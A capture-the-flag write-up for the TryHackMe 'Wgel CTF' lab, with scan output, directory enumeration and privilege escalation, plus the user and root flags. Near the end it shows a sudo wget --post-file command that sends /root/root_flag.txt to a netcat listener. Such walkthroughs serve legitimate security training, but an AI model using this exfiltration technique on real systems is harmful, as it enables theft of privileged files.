# Wgel CTF

Can you exfiltrate the root flag?

[Wgel CTF](https://tryhackme.com/room/wgelctf)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Poking
- Security Misconfiguration
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Wgel CTF

Have fun with this easy box.

```
kali@kali:~/CTFs/tryhackme/Wgel CTF$ sudo nmap -A -sS -sC -sV -O 10.10.141.253
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 10:21 CEST
Nmap scan report for 10.10.141.253
Host is up (0.060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=31712%PV=Y%DS=2%DC=T%G=Y%TM=5F86B5
OS:24%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SE
OS:Q(SP=103%GCD=1%ISR=10F%TI=Z%CI=I%TS=C)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   59.64 ms 10.8.0.1
2   59.92 ms 10.10.141.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.98 seconds
```

```
kali@kali:~/CTFs/tryhackme/Wgel CTF$ gobuster dir -u 10.10.141.253 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.141.253
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/14 10:22:09 Starting gobuster
===============================================================
/sitemap (Status: 301)
Progress: 4548 / 220561 (2.06%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/14 10:22:33 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Wgel CTF$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.141.253/sitemap/ -E -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[sudo] password for kali:

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 4658

Error Log: /opt/dirsearch/logs/errors-20-10-14_10-27-05.log

Target: http://10.10.141.253/sitemap/

Output File: /opt/dirsearch/reports/10.10.141.253/sitemap_20-10-14_10-27-05.txt

[10:27:05] Starting:
[10:27:06] 301 -  321B  - /sitemap/.ssh  ->  http://10.10.141.253/sitemap/.ssh/
[10:27:09] 301 -  320B  - /sitemap/css  ->  http://10.10.141.253/sitemap/css/
[10:27:11] 301 -  322B  - /sitemap/fonts  ->  http://10.10.141.253/sitemap/fonts/
[10:27:11] 301 -  323B  - /sitemap/images  ->  http://10.10.141.253/sitemap/images/
[10:27:11] 200 -   21KB - /sitemap/index.html
[10:27:12] 301 -  319B  - /sitemap/js  ->  http://10.10.141.253/sitemap/js/

Task Completed
```

[view-source:http://10.10.141.253/](view-source:http://10.10.141.253/)

```html
<pre>
/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf


 <!-- Jessie don't forget to udate the webiste -->
          </pre>
```

```
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
```

[https://gtfobins.github.io/gtfobins/wget/#sudo](https://gtfobins.github.io/gtfobins/wget/#sudo)

```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.8.106.222:9001
--2020-10-14 11:33:40--  http://10.8.106.222:9001/
Connecting to 10.8.106.222:9001... connected.
HTTP request sent, awaiting response...
```

```
kali@kali:~/CTFs/tryhackme/Wgel CTF$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.141.253] 41824
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.106.222:9001
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

1. User flag

`057c67131c3d5e42dd5cd3075b198ff6`

2. Root flag

`b1b968b37519ad1daa6408188649263d`
